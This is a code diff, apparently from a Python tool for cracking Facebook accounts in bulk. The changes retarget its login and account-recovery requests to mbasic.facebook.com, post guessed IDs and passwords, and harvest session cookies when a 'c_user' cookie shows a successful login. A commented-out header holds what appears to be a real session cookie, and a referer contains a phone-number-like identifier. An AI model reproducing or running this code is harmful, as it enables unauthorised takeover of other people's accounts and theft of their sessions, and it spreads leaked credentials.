@@ -1088,7 +1088,7 @@ def m4(idf,pwv):
       "sec-fetch-mode": "cors",
       "sec-fetch-dest": "empty",
       "sec-fetch-user": "?1",
-      "referer": "https://m.facebook.com/dialog/oauth?response_type=code&client_id=2076461462396807&redirect_uri=https%3A%2F%2Fduniagames.co.id%2Fnew-callback&scope=public_profile%2Cemail&code_challenge=Yqn9YmMbIY9awk-vWUaq_BuuPrndLEOUQXVYSH1Rleo&code_challenge_method=S256&state=2t0u9qzy4ubndt6ek29y6n1obo9mojr&ret=login&fbapp_pres=0&logger_id=d614149f-136e-431f-babf-db7f365bce91&tp=unspecified",
+      "referer": f'https://mbasic.facebook.com/recover/initiate/?c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Femail%3D{idf}%26li%3Dx-XKZs2ocnd6TEeq6PC-lIUz%26e%3D1348092%26shbl%3D1%26refsrc%3Ddeprecated&fl=default_recover&ctx=msite_initiate_view&recover_method=send_email&ars=m_try_another_way_clicked_from_code_entry',
       "accept-encoding": "gzip, deflate br",
       "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
       }
@@ -1223,23 +1223,30 @@ def m6(idf,pwv):
    'flow': 'initiate_view',
    'pass': ps,}
    header_freefb = {
-            'authority': 'm.facebook.com',
-            'method': 'GET',
-            'path': '/login/device-based/login/async/',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://m.facebook.com',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro,}
-   lo = session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=log_data,headers=header_freefb).text
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5',
+    'cache-control': 'max-age=0',
+    'content-type': 'application/x-www-form-urlencoded',
+    # 'cookie': 'sb=VKa9ZkevIqGKH5mmTljYdUro; datr=VKa9Zn2S1Z_ptvbMV96KkeAx; ps_l=1; ps_n=1; fr=1TtcqI6vgDuofxZxz.AWXECp-O_MF0EdP0poSiUnPaO1s.BmvaYd..AAA.0.0.BmyuW5.AWWpiPLXb3s; wd=1440x773; sfiu=AYjNjXCBXK3MeS9mR3BHwi5bArQOQshk1n3reW-KURQ6HEmafaQ563wt8-Pox_dGti2UY1auDBL1KEzhPiCM5_dlc_tv8w2KL_uh1dFJKiqWrCIR2mGVPbRL7ekgE8cl6OV_DkEOOhHLxed5xDv7gwv8Q-GC6-P6e8hW9hj2OFrrtczWbL2kA1HUZf8wDI_wduXdkK6hHF2U4d8aA-MwqfoynkX726Umzl89q6rKtUPCD8Ch2uvlKllhq20vKeEkQViYB5jbdFWe_hIWoln7NBXMKbnjxUbtTsHbb4BEo5XRnA',
+    'dpr': '1',
+    'origin': 'https://mbasic.facebook.com',
+    'priority': 'u=0, i',
+    'referer': 'https://mbasic.facebook.com/recover/initiate/?c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Femail%3D8389066877%26li%3Dx-XKZs2ocnd6TEeq6PC-lIUz%26e%3D1348092%26shbl%3D1%26refsrc%3Ddeprecated&fl=default_recover&ctx=msite_initiate_view&recover_method=send_email&ars=m_try_another_way_clicked_from_code_entry',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro,
+    'viewport-width': '885',}
+   lo = session.post('https://mbasic.facebook.com/login/account_recovery/name_search/',params=params,headers=header_freefb,data=log_data).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
